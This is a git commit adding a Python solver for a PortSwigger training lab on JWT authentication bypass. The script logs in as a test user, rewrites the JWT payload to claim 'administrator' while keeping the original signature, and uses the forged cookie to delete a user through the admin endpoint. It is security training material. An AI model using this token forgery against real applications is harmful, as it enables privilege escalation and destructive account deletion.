18243186e76a59362422dc96cf6bc41190491b14
ma4747gh <ma4747gh@gmail.com>
2024-01-02 07:46:48 +0200

    Add python script for 'JWT authentication bypass via unverified signature' lab.

---
+++ PortSwigger/Advanced topics/JWT attacks/Lab: JWT authentication bypass via unverified signature.py
@@ -0,0 +1,44 @@
+import sys
+import requests
+import re
+import base64
+
+
+class Solver:
+    def __init__(self, lab_url):
+        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
+
+    def get_csrf(self):
+        response = requests.get(self.lab_url + 'login')
+        return re.search('value="(.*)"', response.text).group(1)
+
+    def get_jwt_token(self):
+        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
+        session = requests.Session()
+        session.post(self.lab_url + 'login', data=data)
+        return session.cookies['session']
+
+    def generate_malicious_token(self):
+        token = self.get_jwt_token()
+        header, payload, signature = token.split('.')
+        payload += '=' * (len(payload) % 4)
+        payload = base64.urlsafe_b64decode(payload)
+        payload = payload.replace(b'wiener', b'administrator')
+        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
+        return header + '.' + payload.decode() + '.' + signature
+
+    def delete_the_user(self):
+        cookies = {'session': self.generate_malicious_token()}
+        response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
+        if 'carlos' not in response.text:
+            print('You solved the lab.')
+            print('Coded by Mohamed Ahmed (ma4747gh).')
+            print('My GitHub account: https://github.com/ma4747gh')
+            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')
+
+    def start(self):
+        self.delete_the_user()
+
+
+solver = Solver(sys.argv[1])
+solver.start()
